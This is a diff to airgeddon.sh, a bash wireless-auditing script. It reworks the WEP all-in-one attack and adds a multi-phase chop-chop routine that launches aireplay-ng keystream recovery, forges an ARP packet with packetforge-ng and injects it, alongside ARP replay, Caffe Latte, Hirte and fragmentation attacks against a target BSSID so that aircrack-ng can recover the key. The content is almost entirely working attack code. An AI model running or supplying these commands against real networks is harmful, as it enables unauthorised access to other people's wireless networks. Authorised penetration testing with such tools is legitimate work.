@@ -2,7 +2,7 @@
 #Title........: airgeddon.sh
 #Description..: This is a multi-use bash script for Linux systems to audit wireless networks.
 #Author.......: v1s1t0r
-#Date.........: 20170319
+#Date.........: 20170320
 #Version......: 7.0
 #Usage........: bash airgeddon.sh
 #Bash Version.: 4.2 or later
@@ -1585,10 +1585,14 @@ function exec_wep_allinone_attack() {
 	wep_fakeauth_pid=""
 	wep_aircrack_launched=0
 	current_ivs=0
+	wep_chopchop_launched=0
+	wep_chopchop_phase=1
+	wep_fragmentation_launched=0
+	wep_fragmentation_phase=1
 	while true; do
 
-		wep_capture_pid_alive=$(ps uax | awk '{print $2}' | grep ${wep_capture_pid} 2> /dev/null)
-		wep_fakeauth_pid_alive=$(ps uax | awk '{print $2}' | grep ${wep_fakeauth_pid} 2> /dev/null)
+		wep_capture_pid_alive=$(ps uax | awk '{print $2}' | grep ${wep_capture_pid} 2> /dev/null | head -n 1)
+		wep_fakeauth_pid_alive=$(ps uax | awk '{print $2}' | grep ${wep_fakeauth_pid} 2> /dev/null | head -n 1)
 
 		if [[ -n ${wep_capture_pid_alive} ]] && [[ -z ${wep_fakeauth_pid_alive} ]]; then
 			recalculate_windows_sizes
@@ -1609,25 +1613,22 @@ function exec_wep_allinone_attack() {
 			xterm -hold -bg black -fg red -geometry "${g5_left3}" -T "Arp Request Replay" -e "aireplay-ng -3 -x 1024 -g 1000000 -b ${bssid} -h ${current_mac} -i ${interface} ${interface}" > /dev/null 2>&1 &
 			wep_processes+=($!)
 
-			wep_chopchop_phase=1
 			recalculate_windows_sizes
-			xterm -hold -bg black -fg brown -geometry "${g5_left4}" -T "Chop-Chop Attack (${wep_chopchop_phase}/3)" -e "yes | aireplay-ng -4 -b ${bssid} -h ${current_mac} ${interface}" > /dev/null 2>&1 &
+			xterm -hold -bg black -fg pink -geometry "${g5_left4}" -T "Caffe Latte Attack" -e "aireplay-ng -6 -F -D -b ${bssid} -h ${current_mac} ${interface}" > /dev/null 2>&1 &
 			wep_processes+=($!)
-			#TODO phase 2 and 3 of Chop-Chop attack
 
-			wep_fragmentation_phase=1
 			recalculate_windows_sizes
-			xterm -hold -bg black -fg blue -geometry "${g5_left5}" -T "Fragmentation Attack (${wep_fragmentation_phase}/3)" -e "yes | aireplay-ng -5 -b ${bssid} -h ${current_mac} ${interface}" > /dev/null 2>&1 &
+			xterm -hold -bg black -fg grey -geometry "${g5_left5}" -T "Hirte Attack" -e "aireplay-ng -7 -F -D -b ${bssid} -h ${current_mac} ${interface}" > /dev/null 2>&1 &
+			wep_processes+=($!)
+
+			recalculate_windows_sizes
+			xterm -hold -bg black -fg blue -geometry "${g5_left6}" -T "Fragmentation Attack (${wep_fragmentation_phase}/3)" -e "yes | aireplay-ng -5 -b ${bssid} -h ${current_mac} ${interface}" > /dev/null 2>&1 &
 			wep_processes+=($!)
 			#TODO phase 2 and 3 of Fragmentation attack
+		fi
 
-			recalculate_windows_sizes
-			xterm -hold -bg black -fg pink -geometry "${g5_left6}" -T "Caffe Latte Attack" -e "aireplay-ng -6 -F -D -b ${bssid} -h ${current_mac} ${interface}" > /dev/null 2>&1 &
-			wep_processes+=($!)
-
-			recalculate_windows_sizes
-			xterm -hold -bg black -fg grey -geometry "${g5_left7}" -T "Hirte Attack" -e "aireplay-ng -7 -F -D -b ${bssid} -h ${current_mac} ${interface}" > /dev/null 2>&1 &
-			wep_processes+=($!)
+		if [ ${wep_chopchop_phase} -lt 4 ]; then
+			wep_chopchop_attack
 		fi
 
 		current_ivs=$(grep "WEP" ${tmpdir}${wep_data}*.csv --exclude=*kismet* | head -n 1 | awk '{print $11}' FS=',' | sed 's/ //g')
@@ -1639,7 +1640,7 @@ function exec_wep_allinone_attack() {
 			wep_processes+=(${wep_aircrack_pid})
 		fi
 
-		wep_aircrack_pid_alive=$(ps uax | awk '{print $2}' | grep ${wep_aircrack_pid} 2> /dev/null)
+		wep_aircrack_pid_alive=$(ps uax | awk '{print $2}' | grep ${wep_aircrack_pid} 2> /dev/null | head -n 1)
 		if [[ -z ${wep_aircrack_pid_alive} ]] && [[ ${wep_aircrack_launched} -eq 1 ]]; then
 			break
 		fi
@@ -1661,6 +1662,45 @@ function exec_wep_allinone_attack() {
 			manage_wep_pot
 		fi
 	fi
+}
+
+#Execute wep chop-chop attack on its different phases
+function wep_chopchop_attack() {
+
+	debug_print
+
+	case ${wep_chopchop_phase} in
+		1)
+			if grep "Now you can build a packet" "${tmpdir}${wepdir}chopchop_output.txt" > /dev/null 2>&1; then
+				wep_chopchop_phase=2
+			else
+				wep_chopchop_phase1_pid_alive=$(ps uax | awk '{print $2}' | grep ${wep_chopchop_phase1_pid} 2> /dev/null | head -n 1)
+				if [[ ${wep_chopchop_launched} -eq 0 ]] || [ -z ${wep_chopchop_phase1_pid_alive} ]; then
+					wep_chopchop_launched=1
+					recalculate_windows_sizes
+					xterm -bg black -fg brown -geometry "${g5_left7}" -T "Chop-Chop Attack (${wep_chopchop_phase}/3)" -e "yes | aireplay-ng -4 -b ${bssid} -h ${current_mac} ${interface} | tee -a \"${tmpdir}${wepdir}chopchop_output.txt\"" > /dev/null 2>&1 &
+					wep_chopchop_phase1_pid=$!
+					wep_processes+=(${wep_chopchop_phase1_pid})
+				fi
+			fi
+		;;
+		2)
+			recalculate_windows_sizes
+			xterm -bg black -fg brown -geometry "${g5_left7}" -T "Chop-Chop Attack (${wep_chopchop_phase}/3)" -e "packetforge-ng -0 -a ${bssid} -h ${current_mac} -k 255.255.255.255 -l 255.255.255.255 -y \"${tmpdir}${wepdir}replay_dec-\"*.xor -w \"${tmpdir}${wepdir}chopchop.cap\"" > /dev/null 2>&1 &
+			wep_chopchop_phase2_pid=$!
+			wep_processes+=(${wep_chopchop_phase2_pid})
+			wep_chopchop_phase=3
+		;;
+		3)
+			wep_chopchop_phase2_pid_alive=$(ps uax | awk '{print $2}' | grep ${wep_chopchop_phase2_pid} 2> /dev/null | head -n 1)
+			if [ -z ${wep_chopchop_phase2_pid_alive} ]; then
+				recalculate_windows_sizes
+				xterm -hold -bg black -fg brown -geometry "${g5_left7}" -T "Chop-Chop Attack (${wep_chopchop_phase}/3)" -e "yes | aireplay-ng -2 -F -r \"${tmpdir}${wepdir}chopchop.cap\" ${interface}" > /dev/null 2>&1 &
+				wep_processes+=($!)
+				wep_chopchop_phase=4
+			fi
+		;;
+	esac
 }
 
 #Execute wps custom pin bully attack
